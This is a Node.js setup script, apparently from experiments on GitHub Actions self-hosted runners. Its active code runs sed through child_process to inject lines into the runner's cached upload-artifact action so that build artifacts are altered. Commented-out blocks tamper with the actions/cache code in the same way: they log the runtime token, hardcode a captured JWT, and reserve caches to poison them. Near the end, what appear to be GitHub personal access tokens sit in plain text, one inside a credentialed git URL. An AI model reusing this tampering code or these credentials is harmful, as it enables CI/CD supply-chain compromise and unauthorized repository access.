const cl_process = require("child_process");
const fs = require("fs");

console.log("this is a setup.....")

// Modify the value of math-homework artifact

// fs.mkdir('artifact', function(err){
//     if (err){
//         console.log(err);
//         return;
//     }
// });

// let writecontent = 'fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/artifact/math-homework.txt", "1")';

// cl_process.exec(`sed -i '642i ${writecontent}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });


//Add a new upload-me artifact, then upload it
fs.mkdir('artifact', function(err){
    if (err){
        console.log(err);
        return;
    }
});

let content = 'fs.writeFileSync("/home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/artifact/upload-me.txt", "2")'

cl_process.exec(`sed -i '10987i ${content}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});

let writecontent1 = 'const path="artifact"';

cl_process.exec(`sed -i '10748s/.*/${writecontent1}/' /home/musset/Documents/actions-runner/_work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});



//Modify the value of cache file
// fs.writeFileSync("/home/musset/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/hello", "18")



// let writecontent = 'console.log(cachePaths);';

// cl_process.exec(`sed -i '47734i ${writecontent}' /home/musset/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });



// fs.writeFileSync(`/home/musset/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache_me`, `cache_try`)
// for(let i = 1; i<=10; i++){
//     fs.writeFileSync(`/home/musset/actions-runner-org/_work/test_actions_02/test_actions_02/cache-folder/cache_me_${i}`, `cache_${i}`)
// }

// let writecontent = 'const cacheId1 = yield reserveCache("cache_me_3", paths, {compressionMethod}); console.log(cacheId1);';
// cl_process.exec(`sed -i '3611i ${writecontent}' /home/musset/actions-runner-org/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }

//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });


// let writecontent = 'console.log(JSON.stringify(token.split("")));';

// cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

// cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

// let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImVCWl9jbjNzWFlBZDBjaDRUSEJLSElnT3dPRSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8yMCBMb2NhdGlvblNlcnZpY2UuQ29ubmVjdCBSZWFkQW5kVXBkYXRlQnVpbGRCeVVyaTowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8yMCIsIklkZW50aXR5VHlwZUNsYWltIjoiU3lzdGVtOlNlcnZpY2VJZGVudGl0eSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL3NpZCI6IkRERERERERELUREREQtRERERC1ERERELURERERERERERERERCIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcHJpbWFyeXNpZCI6ImRkZGRkZGRkLWRkZGQtZGRkZC1kZGRkLWRkZGRkZGRkZGRkZCIsImF1aSI6ImJiMjE2NjEyLWQ4M2EtNDE3My1iN2Q2LTA4NTgwZDI2NDE3YSIsInNpZCI6IjA3MWRlMzQzLWU5MzctNDBhNS1iYjhjLTEzYWZmYjdhY2M4NCIsImFjIjoiW3tcIlNjb3BlXCI6XCJyZWZzL3RhZ3MvdjEuMS4yXCIsXCJQZXJtaXNzaW9uXCI6M30se1wiU2NvcGVcIjpcInJlZnMvaGVhZHMvbWFpblwiLFwiUGVybWlzc2lvblwiOjF9XSIsImFjc2wiOiIxMCIsIm9yY2hpZCI6ImMyM2NiODJjLWIzNWQtNDBmNS1hNTA3LWZiNjU0YjFlNzRlNy51c2UuX19kZWZhdWx0IiwiaXNzIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImF1ZCI6InZzdG9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb218dnNvOjUyMGVkY2VmLTgwNTUtNGJiNy05Mzc3LTE3OTk1ZGNiOTFhYiIsIm5iZiI6MTY5MzA1NzIxOCwiZXhwIjoxNjkzMDgwMDE4fQ.B-2G39Aqe7vaSh-5EXoRXOTopxkOpAJjBnMXp3R8b_vlEDYl2ZsLq1F-zhXig4E5BR2NEmgLEgrLamEXzwIYMcabyqMXfZtAmxU-WWOrLgkGy3G93RyoD1_ijcb8pr3Q_uZ3VeIW7G8h3paMe_72Is-Z8Lfk9gwz_9NILsM40uA8-5bzuPut2KX8znLVwsWnnfsqUowiArz_3b0oeHDjNkTar5ZjpNpS9rz2jLiLewWAQ5baMuoVGxYNm8FdCh0JxA5gv6Oa7q3AX3gJ-oFETcfc_Du4in3nl-VoHxs2wYXfP7WWdPfrh7C1g3UbhnQluRggJ4wGHrc6yG4xs1WLRQ"';

// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/musset/Documents/actions-runner-org/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/musset/Documents/actions-runner-org/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });



// musset0
// https://musset0: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@github.com/orgdreamli/test_actions_02.git

// dreamli0
// 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
